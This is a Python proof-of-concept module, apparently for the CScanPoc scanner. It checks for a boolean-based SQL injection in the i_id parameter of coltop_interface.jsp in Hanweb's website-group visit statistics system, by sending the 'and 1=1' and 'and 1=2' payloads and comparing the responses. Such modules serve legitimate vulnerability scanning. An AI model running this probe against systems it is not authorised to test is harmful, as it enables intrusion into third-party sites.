# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0024'  # 平台漏洞编号，留空
    name = '大汉网站群访问统计系统 coltop_interface.jsp SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        大汉网站群访问统计系统 /vc/vc/interface/styletop/coltop_interface.jsp 注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉网站群访问统计系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '07c83559-17c0-4586-9747-6fe8087934c5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            for id in range(1, 10):
                payload = '/vc/vc/interface/styletop/coltop_interface.jsp?i_id=%s' % id
                target = arg + payload
                code, head, res, errcode, _ = hh.http(target)
                if code == 200 and '没有数据' not in res:
                    code1, head1, res1, errcode1, _1 = hh.http(
                        target + '%20and%201=1')
                    code2, head2, res2, errcode2, _2 = hh.http(
                        target + '%20and%201=2')
                    if code == code1 and res == res1:
                        if res1 != res2:
                            # security_hole(target)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
                    break

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
